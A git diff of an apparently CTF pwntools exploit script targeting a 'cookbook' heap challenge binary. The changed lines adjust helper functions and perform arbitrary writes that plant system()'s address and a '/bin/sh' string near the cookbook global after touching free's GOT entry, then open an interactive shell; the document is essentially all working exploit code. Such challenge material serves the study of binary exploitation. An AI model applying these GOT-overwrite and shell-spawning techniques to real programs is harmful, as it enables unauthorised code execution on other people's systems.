@@ -96,7 +96,8 @@ def delete_current_new_ingredient():
 
 def name_cookbook(name_size, name, wait=True):
     r.sendline("g")
-    r.recvuntil("how long is the name of your cookbook? (hex because you're both a chef and a hacker!) : ")
+    if wait:
+        r.recvuntil("how long is the name of your cookbook? (hex because you're both a chef and a hacker!) : ")
     r.sendline(hex(name_size))
     r.sendline(name)
     if wait:
@@ -176,7 +177,6 @@ def pseudo_arbitrary_write(next_address, data, wait=True):
 def align_to_16_bytes(addr):
     return (addr // 16) * 16
 
-
 cookbook_addr = 0x0804d0a8
 recipe_addr = 0x0804d0a0 # closes 16 byte aligned address to cookbook
 closest_addr_to_cookbook_addr = align_to_16_bytes(cookbook_addr)
@@ -223,6 +223,7 @@ print("system addr:")
 print(hex(system_addr))
 
 pseudo_arbitrary_write(free_got, b"ABCD")
-pseudo_arbitrary_write(free_got + 0x50, pwn.p32(system_addr), wait=False)
+pseudo_arbitrary_write(closest_addr_to_cookbook_addr + 0xf0, pwn.p32(system_addr), wait=False)
+pseudo_arbitrary_write(closest_addr_to_cookbook_addr + 0x100, b"A" * offset_from_closest_addr_to_cookbook  + b"/bin/sh\x00", wait=False)
 
 r.interactive()
